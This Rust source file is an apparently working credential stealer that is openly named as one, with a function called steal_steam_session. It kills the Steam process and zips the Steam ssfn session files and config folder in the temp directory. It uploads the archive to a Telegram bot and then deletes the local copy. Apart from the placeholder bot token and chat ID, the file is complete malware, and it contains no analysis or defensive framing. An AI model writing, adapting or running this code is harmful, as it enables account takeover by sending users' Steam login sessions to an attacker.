use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use zip::write::FileOptions;
use zip::ZipWriter;
use std::io::{Write, Read};
use anyhow::{Result, Context};

const TELEGRAM_TOKEN: &str = "1234";
const ADMIN_CHAT_ID: i64 = 123;

fn send_text_to_telegram(message: &str) -> Result<()> {
    let url = format!("https://api.telegram.org/bot{}/sendMessage", TELEGRAM_TOKEN);
    
    let client = reqwest::blocking::Client::new();
    let response = client
        .post(&url)
        .form(&[("chat_id", ADMIN_CHAT_ID.to_string()), ("text", message.to_string())])
        .send()
        .with_context(|| "Failed to send text message")?;
    
    if response.status().is_success() {
    } else {
    }
    
    Ok(())
}

fn send_file_to_telegram(file_path: &Path) -> Result<()> {
    let url = format!("https://api.telegram.org/bot{}/sendDocument", TELEGRAM_TOKEN);
    
    let client = reqwest::blocking::Client::new();
    let form = reqwest::blocking::multipart::Form::new()
        .file("document", file_path)
        .with_context(|| "Failed to create form")?
        .text("chat_id", ADMIN_CHAT_ID.to_string());
    
    let response = client
        .post(&url)
        .multipart(form)
        .send()
        .with_context(|| "Failed to send request")?;
    
    if response.status().is_success() {
    } else {
    }
    
    fs::remove_file(file_path)
        .with_context(|| format!("Failed to remove file: {:?}", file_path))?;
    
    Ok(())
}

fn kill_process(process_name: &str) -> bool {
    let output = Command::new("taskkill")
        .args(&["/F", "/IM", process_name])
        .output();
    
    match output {
        Ok(_) => true,
        Err(_) => false,
    }
}

fn get_steam_path() -> PathBuf {
    let output = Command::new("wmic")
        .args(&["process", "where", "name='Steam.exe'", "get", "ExecutablePath", "/value"])
        .output();
    
    if let Ok(output) = output {
        if let Ok(output_str) = String::from_utf8(output.stdout) {
            for line in output_str.lines() {
                if line.starts_with("ExecutablePath=") {
                    if let Some(path) = line.strip_prefix("ExecutablePath=") {
                        if let Some(parent) = Path::new(path).parent() {
                            return parent.to_path_buf();
                        }
                    }
                }
            }
        }
    }
    
    let program_files = env::var("PROGRAMFILES(X86)")
        .unwrap_or_else(|_| "C:\\Program Files (x86)".to_string());
    
    PathBuf::from(program_files).join("Steam")
}

fn add_file_to_zip(zip_writer: &mut ZipWriter<fs::File>, file_path: &Path, archive_path: &str) -> Result<()> {
    let mut file = fs::File::open(file_path)
        .with_context(|| format!("Failed to open file: {:?}", file_path))?;
    
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .unix_permissions(0o755);
    
    zip_writer.start_file(archive_path, options)
        .with_context(|| "Failed to start file in zip")?;
    
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .with_context(|| "Failed to read file")?;
    
    zip_writer.write_all(&buffer)
        .with_context(|| "Failed to write to zip")?;
    
    Ok(())
}

fn steal_steam_session() -> Result<()> {
    let _ = send_text_to_telegram("TEST MESSAGE 🟢");
    
    let steam_path = get_steam_path();
    kill_process("Steam.exe");
    
    if !steam_path.exists() {
        let _ = send_text_to_telegram("Steam path not found");
        return Ok(());
    }
    
    let ssfn_files: Vec<PathBuf> = fs::read_dir(&steam_path)
        .with_context(|| format!("Failed to read directory: {:?}", steam_path))?
        .filter_map(|entry| entry.ok())
        .filter(|entry| {
            if let Some(file_name) = entry.file_name().to_str() {
                file_name.starts_with("ssfn")
            } else {
                false
            }
        })
        .map(|entry| entry.path())
        .collect();
    
    let steam_config_path = steam_path.join("config");
    
    let temp_dir = env::var("TEMP")
        .unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
    let zip_path = Path::new(&temp_dir).join("steam_session.zip");
    
    let file = fs::File::create(&zip_path)
        .with_context(|| format!("Failed to create zip file: {:?}", zip_path))?;
    
    let mut zip_writer = ZipWriter::new(file);
    
    if steam_config_path.exists() {
        for entry in walkdir::WalkDir::new(&steam_config_path) {
            let entry = entry.with_context(|| "Failed to read directory entry")?;
            let path = entry.path();
            
            if path.is_file() {
                let relative_path = path.strip_prefix(&steam_path)
                    .with_context(|| "Failed to get relative path")?;
                let archive_path = relative_path.to_string_lossy().replace('\\', "/");
                
                add_file_to_zip(&mut zip_writer, path, &archive_path)?;
            }
        }
    }
    
    for ssfn_file in &ssfn_files {
        if let Some(file_name) = ssfn_file.file_name() {
            if let Some(name) = file_name.to_str() {
                add_file_to_zip(&mut zip_writer, ssfn_file, name)?;
            }
        }
    }
    
    zip_writer.finish()
        .with_context(|| "Failed to finish zip")?;
    
    let _ = send_text_to_telegram("Steam session files collected, sending archive");
    send_file_to_telegram(&zip_path)?;
    let _ = send_text_to_telegram("Steam session extraction completed");
    
    Ok(())
}

fn main() -> Result<()> {
    let _ = steal_steam_session();
    Ok(())
}
